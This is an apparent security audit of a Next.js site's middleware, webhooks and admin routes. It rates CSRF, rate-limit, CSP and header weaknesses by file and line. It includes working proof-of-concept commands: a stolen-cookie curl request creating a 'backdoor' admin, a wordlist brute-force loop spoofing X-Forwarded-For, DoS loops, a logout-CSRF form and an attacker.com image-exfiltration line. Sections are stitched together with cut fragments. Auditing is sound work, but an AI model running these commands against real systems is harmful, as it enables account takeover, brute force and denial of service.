Q5. Is CSRF Origin check bulletproof? (any bypass?)
--------------------------------------------------------------------------------
  ⚠️ NO — src/middleware.ts:157-177  (HIGH for stolen-cookie;
    LOW-MED for browser-mediated)
  Code (lines 157-177):
    const isPublicApi = PUBLIC_API_PREFIXES.some(p => pathname === p || pathname.startsWith(p + "/"));
    if ((method === "POST" || method === "PUT" || method === "DELETE") && !isPublicApi) {
      const origin = req.headers.get("origin");
      const host = req.headers.get("host");
      if (!origin || !host) {
        ... 403 missing_origin ...
      }
      try {
        const originUrl = new URL(origin);
        if (originUrl.host !== host) {
          ... 403 origin_mismatch ...
        }
      } catch {
        ... 403 invalid_origin ...
      }
    }
  Positives:
    - Strict on missing Origin/Host → 403 ✅
    - Uses URL parser to normalize Origin (handles trailing slash,
      case, default ports) ✅
    - Subdomain bypass blocked: Origin "https://evil.victim.com"
      has URL host "evil.victim.com" ≠ "victim.com" → 403 ✅
    - Suffix bypass blocked: Origin "https://victim.com.evil.com"
      has URL host "victim.com.evil.com" ≠ "victim.com" → 403 ✅
    - Browser-mediated CSRF is independently blocked by SameSite=strict
      cookie (login route line 109) ✅
  Bypasses:
    1. SCRIPT-MEDIATED CSRF (HIGH): curl and any HTTP client can set
       BOTH Origin: https://victim.com AND Host: victim.com to any
       value. Middleware cannot distinguish a real browser request
       from a script. Defense relies ENTIRELY on SameSite=strict
       cookie — which DOES NOT protect against stolen-cookie attacks
       (cookie is sent because attacker has it; SameSite only blocks
       cross-site cookie SENDING from a different site's browser
       context).
       Already logged as F-10 / F-NEW-10 in prior audit.
    2. PUBLIC_API_PREFIXES EXEMPTION (MED): any path in the public
       list (middleware.ts:24-37) is fully exempt from the CSRF check.
       The list includes:
         /api/user/login      (OK — public form, no session yet)
         /api/contact         (OK — public form)
         /api/chat            (OK — public form)
         /api/user/logout     (BAD — F-NEW-6/F-24: CSRF-logout
                              clears victim's cookie)
         /api/bale/webhook    (OK — uses HMAC secret, not cookie)
         /api/telegram/webhook (OK — same)
         /api/user/verify     (borderline — POST with no body?)
       The /api/user/logout CSRF is STILL OPEN: a cross-site
       <form action="https://victim.com/api/user/logout" method="POST">
       will clear the victim's access_session cookie. Minor DoS.
    3. CASE MISMATCH (LOW — false-positive, not bypass): URL parser
       lowercases the host portion of Origin, but the Host header is
       sent as-is by the client. If a legit browser sends Host:
       Victim.com (some misconfigured proxies do), the check fails
       and the request is incorrectly rejected.
    4. MISSING Sec-Fetch-Site CHECK (LOW-MED): modern browsers send
       Sec-Fetch-Site: same-origin / cross-site / none. Adding this
       check would close the script-mediated bypass for browser-
       issued requests (though not for non-browser clients).
  Cross-reference: F-10, F-NEW-10, F-24, F-NEW-6 in prior audit
    (all still open).
  Severity: HIGH (stolen-cookie attacks bypass CSRF via spoofed
    Origin/Host; logout-CSRF still open via PUBLIC_API exemption)
  PoC (script-mediated CSRF with stolen cookie):
    # Attacker has stolen access_session cookie (via XSS-sniff, proxy
    # log, referrer leak, etc.). SameSite=strict does NOT block this
    # because the request is made WITH the cookie, not VIA the
    # browser's same-site context.
    curl -s -X POST "https://victim.com/api/admin/users" \
      -H "Origin: https://victim.com" \
      -H "Host: victim.com" \
      -H "Cookie: access_session=<stolen>" \
      -H "Content-Type: application/json" \
      -d '{"username":"backdoor","password":"pwn","role":"admin"}'
    # → 200 OK (Origin matches Host; cookie is valid). Backdoor
    #   admin account created.
  PoC (logout CSRF — public-API exemption):

    <form action="https://victim.com/api/user/logout" method="POST">
      <input type="submit" value="Click me">
    </form>
    # Victim clicks → access_session cookie cleared. Minor DoS.

Q6. Is body size limit (1MB) actually checked?
--------------------------------------------------------------------------------
  ⚠️ WEAK — src/middleware.ts:196-205  (MED)
  Code (lines 196-205):
    if (method === "POST" || method === "PUT" || method === "PATCH") {
      const contentLength = parseInt(req.headers.get("content-length") || "0", 10);
      if (contentLength > 1024 * 1024) { // 1MB limit
        const res = NextResponse.json(
          { ok: false, error: "payload_too_large" },
          { status: 413 }
        );
        return addSecurityHeaders(res);
      }
    }
  Issues:
    1. TRUSTS THE CONTENT-LENGTH HEADER: an attacker controls this
       header. Send `Content-Length: 100` with a 100 MB body —
       middleware sees 100 < 1MB → passes. Next.js's request.json()
       then tries to read 100 MB into memory.
    2. NO TRANSFER-ENCODING: CHUNKED HANDLING: if the attacker omits
       Content-Length entirely and sends `Transfer-Encoding: chunked`,
       parseInt returns 0 → middleware passes. The actual body can be
       gigabytes. (Next.js route handlers do stream the body, but
       request.json() buffers it all into memory.)
    3. DELETE METHOD EXEMPT: DELETE can carry a body (RFC allows it).
       Middleware doesn't check. Today no DELETE route uses a body,
       but fragile.
    4. GET REQUESTS WITH BODY EXEMPT: unusual but possible. Same.
    5. API ROUTES DON'T RE-CHECK: each /api/* route calls
       request.json() / request.text() / request.formData() with no
       length guard. Once middleware is bypassed, nothing stops the
       read.
    6. NEXT.JS BUILT-IN LIMIT NOT TIGHTENED: Next.js App Router has
       no built-in body size limit for plain route handlers (only
       experimental.serverActions.bodySizeLimit applies to server
       actions, default 1 MB). So the only effective limit is the
       OS TCP buffer / reverse proxy (NGINX client_max_body_size
       defaults to 1 MB, but not always configured).
  Severity: MED (DoS vector via oversized body; mitigated if a
    reverse proxy like NGINX enforces client_max_body_size, but not
    guaranteed in all deployments)
  PoC:
    # Lie about Content-Length; send 50MB body via chunked encoding:
    head -c 50000000 /dev/urandom | base64 > /tmp/big.txt
    curl -s -X POST "https://victim.com/api/contact" \
      -H "Content-Type: application/json" \
      -H "Content-Length: 100" \
      -H "Transfer-Encoding: chunked" \
      --data-binary @/tmp/big.txt
    # Middleware: parseInt("100") = 100 < 1MB → passes. /api/contact
    # route tries to JSON-parse 50MB → server OOM or 30s+ CPU burn.

    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src 'self' data: https://fonts.gstatic.com;

    connect-src 'self' https://www.google.com https://www.gstatic.com;
    object-src 'none';
    base-uri 'self';
    form-action 'self' https://formsubmit.co;
    frame-ancestors 'none';
  Positives:
    - frame-ancestors 'none' ✅ (blocks all clickjacking)
    - object-src 'none' ✅ (blocks plugins/Flash/Java)
    - base-uri 'self' ✅ (blocks <base> hijack)
    - form-action restricted ✅
    - frame-src INCLUDES reCAPTCHA (google.com + gstatic.com) ✅
    - frame-src INCLUDES Aparat (www.aparat.com + aparat.com) ✅
    - frame-src INCLUDES YouTube (www.youtube.com + youtube.com) ✅
    - frame-src INCLUDES Vimeo (player.vimeo.com) ✅

    1. 'unsafe-inline' AND 'unsafe-eval' in script-src (MED, F-18).
       A single stored-XSS anywhere renders CSP useless for script
       execution. Should use per-request nonces (Next.js supports this
       via generateImportMeta or unstable_noStore).
    2. img-src allows 'https:' (LOW-MED). Any https image is allowed.
       <img src="https://attacker.com/tracker.png?cookie=...">
       exfiltrates data via URL (img loading isn't blocked by CORS).
       Should be a specific allowlist of known image CDNs.
    3. NO upgrade-insecure-requests (LOW). Mixed-content downgrade
       risk on any HTTP-loaded asset.
    4. NO worker-src / manifest-src / media-src / child-src
       (informational — these default to default-src 'self', which
       is fine).
    5. NO report-uri / report-to (informational — CSP failures fail
       silently, no telemetry to detect violations).
    6. CSP IS NOT APPLIED TO ERROR RESPONSES (HIGH — see Q12).
       429/403/401/413 responses lack CSP. If any error path ever
       reflects user input (today none do), inline script would run.
    7. CSP IS NOT APPLIED TO THE /user-dashboard REDIRECT (HIGH —
       see Q12). The 302 to /user-login has no CSP.
    8. YOUTUBE 'youtu.be' (LOW — informational): youtu.be is a URL

    9. connect-src too restrictive (LOW — informational): does not

  Severity: MED (overall — frame-src covers reCAPTCHA + Aparat +

Q9. Can middleware be bypassed via path traversal (e.g., /api/admin/../user/login)?
--------------------------------------------------------------------------------
  ✅ NO — Next.js normalizes URL paths before middleware sees them
  Analysis:
    Next.js's URL parser normalizes /api/admin/../user/login to
    /api/user/login BEFORE the middleware function is invoked. The
    `req.nextUrl.pathname` (line 139) is the normalized path. So:
      - Attacker sends: GET /api/admin/../user/login HTTP/1.1
      - Next.js normalizes: pathname = "/api/user/login"
      - Middleware checks:
          - ADMIN_API_PREFIX ("/api/admin/") startsWith?
            "/api/user/login" → NO (correct — this is a login
            route, not an admin route).
          - RATE_LIMIT_PATHS includes "/api/user/login"? → YES
            → rate limit applies (5/15min). ✅
      - No bypass.
  Edge cases (all safe):
    - URL-encoded traversal: /api/admin/%2e%2e/user/login. Next.js
      treats %2e%2e as URL-decoded to ".." — App Router decodes the
      pathname before normalization. So %2e%2e becomes ".." and the
      path normalizes to /api/user/login → same as above. ✅ No
      bypass.
    - Double encoding: /api/admin/%252e%252e/user/login. The %25
      decodes to %, leaving "%2e%2e" literal — pathname =
      "/api/admin/%2e%2e/user/login" → startsWith "/api/admin/" →
      YES → middleware's session check applies. ✅ (And the route
      handler won't find a route at that literal path → 404.)
    - Backslash traversal: /api/admin/..%2fuser/login. Same
      handling as %2e%2e — decoded and normalized. ✅
    - Case variations: /API/ADMIN/users — Next.js is case-sensitive
      for routing (Linux FS). /API/ADMIN/users → 404. Not a bypass.
    - Trailing dot: /api/admin/users. (Windows) — Next.js on Linux
      doesn't strip trailing dots. Not a bypass on Linux.
    - Matcher regex (line 227) is anchored: paths starting with
      /api/admin are matched. No regex-injection bypass possible.
  Severity: PASS

    const rateLimitMap = new Map<string, { count: number; resetAt: number }>();
    const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000; // 15 دقیقه

    function checkRateLimit(key: string, max: number): boolean {
      const now = Date.now();
      const entry = rateLimitMap.get(key);
      if (!entry || entry.resetAt < now) {
        rateLimitMap.set(key, { count: 1, resetAt: now + RATE_LIMIT_WINDOW_MS });
        return true;
      }
      if (entry.count >= max) return false;
      entry.count++;
      return true;
    }

    // پاکسازی دوره‌ای برای جلوگیری از نشت حافظه
    if (typeof setInterval !== "undefined") {
      setInterval(() => {
        const now = Date.now();
        for (const [k, v] of rateLimitMap) {
          if (v.resetAt < now) rateLimitMap.delete(k);
        }
      }, 5 * 60 * 1000).unref?.();
    }
  Positives:
    - There IS a periodic sweep every 5 minutes ✅ (better than the
      loginAttempts Map in src/app/api/user/login/route.ts:22 —
      F-25, which has NO sweep at all).
    - .unref?.() prevents the interval from keeping the Node.js
      process alive.
  Negatives:
    1. SWEEP INTERVAL TOO LONG UNDER IP-ROTATION ATTACK (LOW):
       with X-Forwarded-For spoofing (Q11), attacker can generate
       millions of unique keys in seconds. Map grows unbounded
       between 5-min sweeps. At ~100 req/sec with random IPs, that's
       30,000 entries per 5-min window. Each entry ~100 bytes →
       ~3 MB. Not catastrophic but grows with attack duration.
    2. EDGE RUNTIME HAS NO setInterval (MED): on Vercel Edge
       runtime (which middleware may run on), setInterval is
       undefined. The `if (typeof setInterval !== "undefined")`
       guard means the sweep is SKIPPED ENTIRELY on Edge →
       guaranteed memory leak for the lifetime of the Edge worker.
    3. SERVERLESS COLD-STARTS RESET MAP (informational — actually
       a positive side-effect): each cold start wipes rateLimitMap,
       so the leak doesn't accumulate across deployments. But rate
       limits also reset → attacker can force a cold start (by
       simply waiting or by hitting a different region).
    4. UNBOUNDED MAP GROWTH ON A SINGLE WARM INSTANCE: even with
       sweep, between sweeps the Map can grow to OOM if attacker is
       fast enough. Cap on Map size would help.
    5. NO LRU / NO MAX-ENTRIES: Map just grows. Should use an LRU
       cache with a hard cap (e.g., 10,000 entries) and evict
       oldest.
  Cross-reference: F-25 in prior audit (loginAttempts Map in
    /api/user/login/route.ts has NO sweep — still open; middleware's
    rateLimitMap is BETTER but still imperfect).
  Severity: LOW (mitigated by sweep + cold starts; main concern is
    Edge runtime where sweep is silently skipped)
  PoC:
    # Slow memory exhaustion (combine with Q11 X-Forwarded-For
    # spoofing):
    while true; do
      ip="$RANDOM.$RANDOM.$RANDOM.$RANDOM"
      curl -s -o /dev/null "https://victim.com/api/user/login" \
        -H "X-Forwarded-For: $ip" \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"x"}'
    done
    # On a single warm Edge worker, Map grows unbounded →
    # eventually OOM. (Mitigated if Vercel recycles workers
    # frequently.)

--------------------------------------------------------------------------------
Q11. Can attacker spoof X-Forwarded-For to bypass rate limit?
--------------------------------------------------------------------------------
  ❌ YES — src/middleware.ts:145-146  (HIGH — F-9 still open)
  Code (lines 145-146):
    const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
               req.headers.get("x-real-ip") || "unknown";
  Analysis:
    - X-Forwarded-For is taken DIRECTLY from the client's header
      without any validation against a trusted-proxy allowlist.
    - The first comma-separated entry is used as the client IP.
      In a legitimate proxy chain (Cloudflare → origin),
      X-Forwarded-For = "client_ip, cloudflare_ip" and the first
      entry IS the client IP. ✅ correct in that case.
    - BUT: if there is NO proxy in front of Next.js (direct
      exposure), OR a proxy that APPENDS to X-Forwarded-For
      without stripping the client's value (NGINX default with
      $proxy_add_x_forwarded_for), the attacker controls the
      first entry.
    - Cloudflare STRIPS and replaces X-Forwarded-For with the
      true client IP → safe.
    - Vercel's edge layer SETS X-Forwarded-For based on connecting
      IP, but DOES NOT strip client-supplied values → exploitable.
    - The fallback `req.headers.get("x-real-ip")` is similarly
      attacker-controlled (NGINX sets it, but only if configured;
      otherwise it's a client header).
  Impact:
    Rate limit key = `${pathname}:${ip}`. Each unique spoofed IP
    creates a fresh bucket. Attacker sends N requests with N
    different X-Forwarded-For values → gets N×5 login attempts
    per 15 min (effectively unlimited).
  Cross-reference: F-9 in prior audit (still open). Also
    amplifies Q4 (rate limit), Q10 (memory leak), F-5 (admin
    brute-force — though /api/admin/* has no rate limit anyway).
  Severity: HIGH (login brute-force, contact-form spam, chat-flood
    all become unlimited)
  PoC:
    #!/bin/bash
    # Bypass /api/user/login 5/15min rate limit:
    WORDLIST="/usr/share/wordlists/rockyou.txt"
    i=0
    while IFS= read -r pw; do
      i=$((i+1))
      fake_ip="10.0.0.$((i % 256))"   # rotate every request
      curl -s -o /dev/null -w "%{http_code} ${pw}\n" \
        -X POST "https://victim.com/api/user/login" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: ${fake_ip}" \
        -d "{\"username\":\"admin\",\"password\":\"${pw}\"}"
    done < "$WORDLIST"
    # Every request gets HTTP 200/401 (not 429) — rate limit never
    #   triggers because each request uses a fresh IP bucket.

--------------------------------------------------------------------------------
Q12. Is the response CSP applied to all responses including redirects?
--------------------------------------------------------------------------------
  ❌ NO — src/middleware.ts:98-106, 183, 208-214  (HIGH)
  addSecurityHeaders function (lines 98-106):
    function addSecurityHeaders(res: NextResponse): NextResponse {
      res.headers.set("X-Content-Type-Options", "nosniff");
      res.headers.set("X-Frame-Options", "DENY");
      res.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
      res.headers.set("Permissions-Policy", "camera=(), microphone=(), geolocation=(), payment=()");
      res.headers.set("X-XSS-Protection", "0");
      res.headers.set("X-Powered-By", "");
      return res;
    }
  Analysis:
    addSecurityHeaders() sets 6 generic security headers but DOES NOT
    set Content-Security-Policy or Strict-Transport-Security. Those
    two are ONLY set on the final NextResponse.next() (line 209 CSP,
    line 212 HSTS).
  Responses missing CSP and HSTS:
    1. 429 rate-limit response (line 149-154) — calls
       addSecurityHeaders but NOT CSP/HSTS.
    2. 403 missing_origin (line 164-166) — same.
    3. 403 origin_mismatch (line 170-172) — same.
    4. 403 invalid_origin (line 174-176) — same.
    5. 401 unauthorized (line 190-192) — same.
    6. 413 payload_too_large (line 199-204) — same.
    7. 302 redirect to /user-login (line 183) — NextResponse.redirect()
       is returned WITHOUT calling addSecurityHeaders at all. So this
       response has NEITHER CSP, NEITHER HSTS, NEITHER X-Frame-Options,
       NEITHER X-Content-Type-Options, NEITHER Referrer-Policy,
       NEITHER Permissions-Policy. The redirect is the ONLY response
       that loses even the basic 6 headers.
  Severity: HIGH (defense-in-depth broken; CSP missing on 6 of 7
    non-pass-through responses; redirect has zero security headers)
  PoC:
    # Verify CSP missing on 401 (admin route without session):
    curl -sI "https://victim.com/api/admin/users" | grep -i content-security
    # → (empty — no CSP header on the 401 response)
    # Verify CSP missing on 429 (rate-limited response):
    for i in 1 2 3 4 5 6; do
      curl -sI -X POST "https://victim.com/api/user/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"x","password":"y"}'
    done | grep -i content-security
    # → (empty — 429 response has no CSP)
    # Verify ZERO security headers on /user-dashboard redirect:
    curl -sI "https://victim.com/user-dashboard" | grep -iE 'content-security|x-frame|strict-transport|referrer|permissions'
    # → HTTP/2 307
    #   location: /user-login
    #   (NO CSP, NO X-Frame-Options, NO HSTS, NO Referrer-Policy,
    #    NO Permissions-Policy on the 307 redirect)
  Real-world impact:
    - The JSON error responses today contain no user-controlled
      content, so missing CSP is defense-in-depth only.
    - The 307 redirect to /user-login is more concerning: missing
      X-Frame-Options means the redirect response itself COULD be
      framed (though the browser will follow the redirect to
      /user-login which DOES have X-Frame-Options: DENY via its own
      pass-through middleware). Net effect: iframe-embedding the
      redirect itself is not very useful, but the inconsistency is
      a red flag.
    - Missing HSTS on error responses: low impact (HSTS is mainly
      for HTML pages), but inconsistent.

  Q5, Q11, Q12), 3 PARTIAL/MED (Q4, Q7, Q8), 1 WEAK/MED (Q6), 1 LOW
  (Q10).
  The middleware's most serious weaknesses are:
    (a) Session validation in middleware is format-only (Q3) — the
        real HMAC check happens at the API layer, so middleware-
        level protection can be bypassed with a forged cookie that
        has the correct shape but a bogus signature. Defense-in-depth
        holds only because every admin route independently calls
        checkAdminAuth/checkAdminSession. The /user-dashboard page
        gate is also bypassable.
    (b) The CSP and HSTS headers are only set on the pass-through
        NextResponse.next() (Q12) — all 6 error responses (429/403/
        401/413) and the /user-dashboard redirect lack CSP, and the
        redirect lacks ALL security headers.
    (c) Rate limiting is effectively unlimited against an attacker
        who controls X-Forwarded-For (Q11), which is trivially
        spoofable on most deployments (except behind Cloudflare).

  Cross-references to prior findings (still open):

================================================================
FINDINGS (file:line)
================================================================

----- 1. Secret required?  [OK, both] -----
- bale/route.ts:19   `const secret = url.searchParams.get("secret") || req.headers.get("x-webhook-secret") || "";`
- bale/route.ts:20   `const expectedSecret = process.env.BALE_WEBHOOK_SECRET;`
- bale/route.ts:21-23 If `expectedSecret` is unset → 503 `webhook_not_configured`.
- bale/route.ts:27   Length + timingSafeEqual check; empty secret string → length mismatch → 403.
- telegram/route.ts:9-13 identical pattern with `TELEGRAM_WEBHOOK_SECRET`.
Verdict: secret is mandatory; missing env aborts with 503, missing/empty client secret → 403.

----- 2. timingSafeEqual used?  [WEAK, both] -----
- bale/route.ts:25-27    `Buffer.from(secret)` → `timingSafeEqual(secretBuf, expBuf)` — but preceded by
  `secretBuf.length !== expBuf.length` short-circuit. Length comparison happens BEFORE the constant-time
  compare, so attacker can infer secret length via timing differential. Same flaw:
- telegram/route.ts:14-16  identical pattern.
- Minor: `Buffer.from(secret)` defaults to UTF-8; if secret contains multibyte chars, byte length
  differs from string length — acceptable but worth noting.
- Recommendation (NOT applied): hash both sides with SHA-256 then timingSafeEqual (fixed length, no leak).

----- 3. Rate limit on secret?  [FAIL, both] -----
- middleware.ts:21   `RATE_LIMIT_PATHS = ["/api/user/login", "/api/contact", "/api/chat"]`
  — webhooks NOT included.
- middleware.ts:144  Rate-limit block runs only for paths in `RATE_LIMIT_PATHS`.
- Neither bale/route.ts nor telegram/route.ts implements any internal throttle.
- Impact: an attacker can brute-force `?secret=...` with unlimited POSTs; only the 1 MB body cap
  (middleware.ts:198) and `Buffer.from(secret)` cost bound the rate, not a request counter.
- This compounds with finding #4 (secret in URL) and #7 (CSRF-exempt): the webhook is a public,
  unthrottled, secret-guessing oracle.

----- 4. Secret in URL?  [FAIL, HIGH, both] -----
- bale/route.ts:8     comment: `POST /api/bale/webhook?secret=XXX`
- bale/route.ts:19    `url.searchParams.get("secret")` — first-class source.
- telegram/route.ts:5 comment: `POST /api/telegram/webhook?secret=XXX`
- telegram/route.ts:9 `url.searchParams.get("secret")`.
- Impact: query string is logged by every reverse proxy / Vercel / nginx access log, captured in
  `Referrer` headers if the endpoint ever emits a redirect, persists in browser history if hit
  from a browser, and is forwarded to upstream in `X-Forwarded-URI`-style headers. The secret
  stops being a secret the first time it transits a log.
- Mitigation (not applied): require `X-Webhook-Secret` header only; reject `?secret=`.

----- 5. Header accepted?  [OK, both] -----
- bale/route.ts:19   `|| req.headers.get("x-webhook-secret")` — header is accepted as fallback.
- telegram/route.ts:9 same.
- Header channel exists, so fixing #4 only requires removing the `url.searchParams.get("secret")`
  branch. No code change applied here.
- Note: neither route reads Telegram's official `X-Telegram-Bot-Api-Secret-Token` header that
  Telegram delivers when `setWebhook` was called with `secret_token`. Bale has no equivalent
  official header. The custom `x-webhook-secret` is a project-specific convention.

----- 6. Body validated?  [FAIL, both] -----
- bale/route.ts:31   `await req.json().catch(() => null);` then `if (!body) → 400`.
- bale/route.ts:36   `processBaleWebhook(body)` — body typed `any` (lib/bale.ts:108).
- bale/lib/bale.ts:109-110 only check `body?.message` and `body.message.text` — no schema,
  no type guards, no max length on `message.text`, no validation of `message.from.id`,
  `message.chat.id`, or `update_id`.
- telegram/route.ts:19-21 + lib/telegram.ts:66-68 same pattern.
- Missing specifically:
    * No `message.from.id === chatId` check (admin-allowlist). ANY Bale/Telegram user who can
      reach the bot and knows the webhook secret can issue `/disable`, `/list`, `/reply`, `/chat`.
    * No length cap on `text` (only the 1 MB middleware cap applies); a multi-MB body still
      parses to JSON, then `text.split(/\s+/)` allocates an unbounded array.
    * No verification of Telegram's `secret_token` header.
    * No JSON-schema validation (zod / arktype) — malformed shapes silently fall through to
      the `default:` case and return `Unknown command` (bale/lib/bale.ts:230).

----- 7. CSRF-exempt?  [YES, intentional, both] -----
- middleware.ts:24-37  `PUBLIC_API_PREFIXES` explicitly lists `/api/bale/webhook` (line 33)
  and `/api/telegram/webhook` (line 34).
- middleware.ts:158-159 CSRF/Origin check is skipped for public prefixes.
- This is correct for inbound webhook POSTs from Bale/Telegram servers (cross-origin by nature).
- Side effect: combined with #3 (no rate limit) and #4 (secret in URL), an attacker on any
  origin can fire POSTs at the webhook with no Origin enforcement — only the shared secret
  stands between them and admin actions.

----- 8. Replay protection?  [FAIL, both] -----
- Neither route tracks `update_id`, nonce, timestamp, or HMAC signature.
- bale/route.ts:25-29 + telegram/route.ts:14-18: only secret equality is checked; identical
  body + secret replays N times → all succeed.
- Impact examples:
    * Replays of `/disable` body keep AI API disabled (or `/enable` re-enables) — toggling
      service state via captured payload.
    * Replays of `/reply {id} {text}` create duplicate `messageReply` rows
      (lib/bale.ts:143-145, lib/telegram.ts:88).
    * Replays of `/chat {sessionId} {text}` inject duplicate assistant messages into visitor
      chat sessions (lib/bale.ts:163-165, lib/telegram.ts:96).
- No `update_id` dedup map, no DB unique constraint on `(webhook_update_id)`.
- Recommendation (not applied): store `update_id` in a dedup table; reject duplicates; also
  verify HMAC signature if Bale/Telegram signed payloads.

----- 9. Command injection via body?  [OK on shell/SQL; PRIVILEGE ESCALATION instead] -----
- Static analysis of lib/bale.ts and lib/telegram.ts:
    * No `child_process`, no `exec/spawn`, no `eval()`, no `new Function()`.
    * No raw SQL — all DB access via Prisma parameterized queries
      (lib/bale.ts:118,139,143,159,163,166,174,183,192,197; lib/telegram.ts:75,86,88,94,96,97,101,105,109,110).
    * `parts[0].toLowerCase()` switch is fixed-case (`/list`,`/reply`,`/chat`,`/disable`,
      `/enable`,`/stats`,`/start`,`/help`). No shell metachar interpretation.
- Therefore: NO classical command injection and NO SQL injection.
- BUT a privilege-escalation / authorization vulnerability exists:
    * lib/bale.ts:108-114 and lib/telegram.ts:66-71 read `body.message.text` from ANY sender.
      There is NO check that `body.message.from.id` (Bale) or `body.message.chat.id`
      (Telegram) equals the configured admin chatId (`config.chatId` from getBaleConfig /
      getTelegramConfig).
    * Consequence: any Bale/Telegram user who can DM the bot and who has (or guesses) the
      webhook secret can run admin commands — read all contact messages (`/list`),
      read stats (`/stats`), disable AI API (`/disable`), or inject arbitrary assistant
      content into any visitor chat session (`/chat {sessionId} {arbitrary text}`).
    * This is the same severity class as command injection from a trust perspective:
      untrusted input reaches privileged operations.
- Markdown injection (low severity): reply text in `/reply` and `/chat` is sent back through
  `sendBaleMessage`/`sendTelegramMessage` with `parse_mode: "Markdown"`
  (lib/bale.ts:55, lib/telegram.ts:30). An attacker controlling the reply text could
  spoof formatting/links in the admin's own Bale/Telegram chat. Not a server compromise.

----- 10. Info leak?  [MINOR-to-MODERATE, both] -----
- bale/route.ts:46   `console.error("[/api/bale/webhook] error:", err);` — server-side only;
  client receives generic `error: "server_error"` (line 47). OK.
- bale/route.ts:22,28 reveal `webhook_not_configured` vs `invalid_secret` — leaks whether the
  env is set. Minor (helps attacker decide to stop brute-forcing).
- bale/route.ts:55-77 GET `/api/bale/webhook` returns the **bot token in the response body**:
    line 73-75  `webhookUrl: \`https://api.bale.ai/v1/bots${token}/setWebhook\``
  Although guarded by `checkAdminAuth` (line 56), this still echoes a secret credential
  (BALE_BOT_TOKEN) into an HTTP response body. Any admin-session hijack, log capture, or
  browser-extension MITM exposes the token. Recommend returning a boolean `hasToken` only.
- telegram/route.ts:25 logs full err server-side; line 26 returns bare `{ ok: false }` with
  no error string — slightly better than Bale. Asymmetric error shapes between the two routes.
- bale/lib/bale.ts:230 + telegram/lib/telegram.ts:116 echo attacker-controlled `cmd` back in
  `Unknown command: ${cmd}` reply — reflected to the same chat. Minor.
- bale/lib/bale.ts:127-129 + telegram/lib/telegram.ts:80-81 `/list` exposes the first 80 chars
  of every contact message + message IDs to whoever can call the webhook. Combined with #9
  (no sender verification), this is a data-exfiltration primitive if the secret leaks.

Q6. Unhandled promise rejections?
================================================================================
  ❌ YES — multiple sources.

  (A) Route handlers without try/catch wrapping async DB calls (Q1 list):
    All 11 handlers in Q1's MISSING-try/catch list will produce unhandled
    promise rejections when Prisma throws (e.g., DB connection lost, unique
    constraint violation, foreign-key violation, malformed query). Next.js
    catches these at the framework level and returns its default 500 HTML
    page (NOT JSON), breaking the API contract for JSON clients.

    Specific rejection sources (file:line of async call without try/catch):
      - src/app/api/user/verify/route.ts:22 (db.accessUser.findUnique)
      - src/app/api/user/verify/route.ts:27 (checkAccess)
      - src/app/api/user/verify/route.ts:30 (logAccess)
      - src/app/api/admin/users/route.ts:38 (db.accessUser.findMany)
      - src/app/api/admin/users/route.ts:98 (db.accessUser.findUnique)
      - src/app/api/admin/users/route.ts:104 (hashPassword)
      - src/app/api/admin/users/route.ts:106 (db.accessUser.create)
      - src/app/api/admin/users/[id]/route.ts:40 (findUnique)
      - src/app/api/admin/users/[id]/route.ts:68 (hashPassword)
      - src/app/api/admin/users/[id]/route.ts:76 (update)
      - src/app/api/admin/users/[id]/route.ts:117 (findUnique)
      - src/app/api/admin/users/[id]/route.ts:123 (delete)
      - src/app/api/admin/users/logs/route.ts:33 (findMany)
      - src/app/api/admin/users/logs/route.ts:45 (count)
      - src/app/api/bale/webhook/route.ts:56 (checkAdminAuth)
      - src/app/api/bale/webhook/route.ts:61-65 (Promise.all getSetting×3)
      - src/app/rss.xml/route.ts:10 (db.article.findMany)
      - src/app/sitemap.xml/route.ts:12-15 (Promise.all db×3)

  (B) Fire-and-forget promises WITH .catch (✅ safe — silent but caught):
      - src/app/api/contact/route.ts:152-156 — `import("@/lib/bale").then(...)
        .catch(() => {})` — caught.
      - src/app/api/contact/route.ts:159-176 — `import("@/lib/settings")
        .then(async ...).catch(() => {})` — caught.
      - src/app/api/contact/route.ts:173 — inner `fetch(...).catch(() => {})` — caught.
      - src/app/api/chat/route.ts:140-149 — `import("@/lib/bale").then(...)
        .catch(() => {})` — caught.

  (C) Process-level unhandled-rejection / uncaught-exception handler:
      - Grep for `process.on(`, `unhandledRejection`, `uncaughtException`
        across `src/` → ZERO matches.
      - NO global handler. Relies entirely on Next.js's internal handler.
      - On Vercel/Node.js production runtime, unhandled rejections emit a
        warning to stderr but do NOT crash (Node ≥15 default behavior). On
        Edge runtime, behavior is worker-dependent.

  (D) Async operations INSIDE try/catch that themselves have inner awaits
      whose rejections would be caught by the outer try/catch — these are
      SAFE. (Most admin routes follow this pattern.)

  Severity: HIGH (11 handlerspread across 9 route files can produce
    unhandled rejections; no process-level safety net; default Next.js
    500 HTML breaks JSON clients).

2. sendReply  (page.tsx:379-402)
--------------------------------------------------------------------------------
  ✅ Implementiert — POSTs to /api/admin/reply, refreshes list on success.
  Code (lines 379-402):
    async function sendReply(msgId: string) {
      if (!replyText.trim()) return;
      try {
        const res = await fetch("/api/admin/reply", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "include",
          body: JSON.stringify({ messageId: msgId, reply: replyText }),
        });
        const data = await res.json();
        if (data.ok) {
          setReplyingTo(null);
          setReplyText("");
          // Refresh messages
          const refreshRes = await fetch("/api/messages", { credentials: "include" });
          const refreshData = await refreshRes.json();
          if (refreshData.ok) setMessages(refreshData.messages || []);
        } else {
          setError(data.error || "reply_failed");
        }
      } catch {
        setError("network");
      }
    }
  Question: refreshes list? — ✅ YES, on success (lines 393-395).
  Positives:

    - Refreshes message list via second fetch to /api/messages (lines 393-395) ✅
    - credentials: "include" on both fetches ✅

  Negatives:

3. deleteMessage  (page.tsx:404-422)
--------------------------------------------------------------------------------
  ✅ Implementiert — POSTs to /api/admin/clear with {target:"message", id}.
  Code (lines 404-422):
    async function deleteMessage(msgId: string) {
      if (!confirm(lang === "fa" ? "حذف این پیام؟" : ...)) return;
      try {
        const res = await fetch("/api/admin/clear", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "include",
          body: JSON.stringify({ target: "message", id: msgId }),
        });
        const data = await res.json();
        if (data.ok) {
          setMessages(prev => prev ? prev.filter(m => m.id !== msgId) : prev);
        } else {
